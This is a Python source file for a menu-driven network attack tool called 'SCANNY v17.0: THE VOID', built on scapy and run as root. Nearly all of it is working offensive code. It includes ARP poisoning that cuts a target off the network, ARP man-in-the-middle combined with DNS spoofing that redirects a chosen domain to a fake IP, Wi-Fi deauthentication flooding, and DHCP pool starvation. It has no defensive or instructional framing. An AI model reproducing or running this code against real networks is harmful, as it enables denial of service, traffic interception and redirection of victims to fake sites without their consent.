import sys
import os
import time
import threading
import sqlite3
import hashlib
from scapy.all import *

# --- STYLING (ABYSS RED) ---
R = '\033[31m'
B = '\033[1m'
E = '\033[0m'

# --- SECURITY ---
def init_db():
    conn = sqlite3.connect("void.db")
    conn.execute("CREATE TABLE IF NOT EXISTS users (user TEXT, pass TEXT)")
    conn.commit()
    conn.close()

def login():
    os.system('clear')
    init_db()
    conn = sqlite3.connect("void.db")
    curr = conn.cursor()
    curr.execute("SELECT * FROM users")
    row = curr.fetchone()
    if not row:
        print(f"{R}REGISTRATION REQUIRED{E}")
        u = input("User: "); p = hashlib.sha256(input("Pass: ").encode()).hexdigest()
        conn.execute("INSERT INTO users VALUES (?,?)", (u, p)); conn.commit()
        return False
    u = input(f"{R}User: "); p = hashlib.sha256(input("Pass: ").encode()).hexdigest()
    return u == row[0] and p == row[1]

# --- THE VOID ENGINE ---

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

def wifi_deauth(target_mac, ap_mac, iface):
    """ Kicks device off Wi-Fi (Requires Monitor Mode) """
    print(f"{R}[!] DEAUTH TSUNAMI STARTING...{E}")
    # Reason 7 = Class 3 frame received from nonassociated station
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
    try:
        sendp(pkt, iface=iface, count=10000, inter=0.1, verbose=False)
    except Exception as e:
        print(f"{R}Error: Ensure {iface} is in Monitor Mode (airmon-ng start {iface}){E}")

def dhcp_starve():
    """ Floods router with DHCP requests to steal all IPs """
    print(f"{R}[!] STARVING DHCP POOL...{E}")
    while True:
        pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=RandString(12, b"0123456789abcdef")) / \
              DHCP(options=[("message-type", "discover"), "end"])
        sendp(pkt, verbose=False)

def dns_overlord(target_ip, domain, fake_ip):
    """ Advanced DNS Spoofing with integrated ARP Redirect """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    gw = conf.route.route("0.0.0.0")[2]
    t_mac = get_mac(target_ip)
    g_mac = get_mac(gw)
    
    def arper():
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=t_mac, psrc=gw), verbose=False)
            send(ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target_ip), verbose=False)
            time.sleep(1)

    def dns_callback(pkt):
        if pkt.haslayer(DNSQR) and domain in str(pkt[DNSQR].qname):
            reply = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=fake_ip))
            send(reply, verbose=False)
            print(f"{R}[!] REDIRECTED: {domain} -> {fake_ip}{E}")

    threading.Thread(target=arper, daemon=True).start()
    sniff(filter=f"udp port 53 and host {target_ip}", prn=dns_callback)

# --- MAIN MENU ---
def main():
    if not login(): sys.exit()
    gw = conf.route.route("0.0.0.0")[2]
    iface = conf.iface

    while True:
        os.system('clear')
        print(f"{R}{B}=== SCANNY v17.0: THE VOID ==={E}")
        print(f"{R}IFACE: {iface} | GATEWAY: {gw}{E}")
        print("-" * 50)
        print(" [1] DEEP SCAN (IP/MAC/Hostname)")
        print(" [2] TOTAL BLACKOUT (High-Freq ARP Kill)")
        print(" [3] DNS OVERLORD (Redirect Domain)")
        print(" [4] WI-FI DEAUTH (Kick off Wi-Fi - MONITOR REQ)")
        print(" [5] DHCP STARVATION (Crash Network Pool)")
        print(" [6] ICMP REDIRECT (Alternative Routing)")
        print(" [7] SYN FLOOD (DDoS Stress Test)")
        print(" [0] RESET & WIPE")
        print(" [99] EXIT")
        print("-" * 50)

        c = input(f"{R}void > {E}")

        if c == '1':
            net = input("Range (e.g. 192.168.1.0/24): ")
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net), timeout=2, verbose=False)
            for s, r in ans: print(f"IP: {r.psrc:15} | MAC: {r.hwsrc}")
            input("Press Enter...")
        elif c == '2':
            t = input("Target IP: ")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            t_mac = get_mac(t); g_mac = get_mac(gw)
            while True:
                send(ARP(op=2, pdst=t, hwdst=t_mac, psrc=gw), verbose=False)
                send(ARP(op=2, pdst=gw, hwdst=g_mac, psrc=t), verbose=False)
                time.sleep(0.1)
        elif c == '3':
            dns_overlord(input("Target IP: "), input("Domain: "), input("Fake IP: "))
        elif c == '4':
            wifi_deauth(input("Target MAC: "), input("Router MAC: "), iface)
        elif c == '5':
            dhcp_starve()
        elif c == '0':
            os.remove("void.db"); sys.exit()
        elif c == '99': break

if __name__ == "__main__":
    if os.getuid() != 0: print("SUDO REQ!"); sys.exit()
    main()
